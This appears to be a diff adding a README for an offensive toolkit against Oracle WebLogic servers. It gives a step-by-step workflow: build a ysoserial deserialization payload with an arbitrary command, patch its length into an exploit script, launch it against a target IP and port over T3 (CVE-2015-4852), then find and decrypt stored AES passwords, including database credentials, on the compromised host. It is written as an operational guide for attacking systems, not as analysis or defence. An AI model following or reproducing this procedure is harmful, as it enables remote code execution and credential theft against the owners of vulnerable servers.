@@ -1,0 +1,44 @@
+Usage:
+ -Find a vulnerable WebLogic server with T3 enabled. Currently, only instances serving a root index page seem to be working.
+ -run: java -jar ysoserial-0.0.2-all.jar CommonsCollections1 '<command to be executed on target>' > payload.out
+ -Find the payload size by running: python webLogPayload.py 64.64.64.64 8.8.8.8 payload.out
+ -Edit the third and second byte of the 'payload' variable in webIllogical.py to match the length you just found
+ -run: python webIllogical.py <target_ip> <target_port> payload.out
+ -Once a reliable channel has been established, find 'setWLSEnv.sh" and source the file
+ -Grep around for '[AES]' to find decryptable passwords
+ -run: java weblogic.WLST decryptPassword.py <local_domain_path> <AES_string>
+    -Be sure to remove any '\' characters from the AES string
+
+
+TODO:
+ -Automate finding the length and altering the payload to match. Need to check protocol specs...
+
+
+Files:
+ ::ysoserial-0.0.2-all.jar
+   -Usage: java -jar ysoserial-0.0.2-all.jar CommonsCollections1 '<command to be executed on target>' > payload.out
+
+   -Credit: https://github.com/frohoff/ysoserial
+
+
+ ::webLogPayload.py
+   -Usage: python webLogPayload.py payload.out
+
+   Returns a hex string representation of the length of the payload to be sent to the target WebLogic server by webIllogical.py script
+
+
+ ::webIllogical.py
+   -Usage: python webIllogical.py <target_ip> <target_port> payload.out
+
+   Takes advantage of the T3 protocal used by WebLogic to exploit an Apache CommonsCollections vulnerability (CVE-2015-4852) that allows for RCE. Currently only working
+   against targets that serve a root index page.
+   Versions 10.3.6.0, 12.1.2.0, 12.1.3.0, and 12.2.1.0 are affected.
+
+   -Credit: FoxGlove Security - https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/
+
+
+ ::decryptPassword.py
+   -Usage: java weblogic.WLST decryptPassword.py <domain_local_path> <AES_string>
+
+   Implements native WebLogic tools to take advantage of the fact that passwords are being stored with symetric encryption instead of being hashed. Decrypts passwords stored
+   by WebLogic which often include creds to the backend databases.
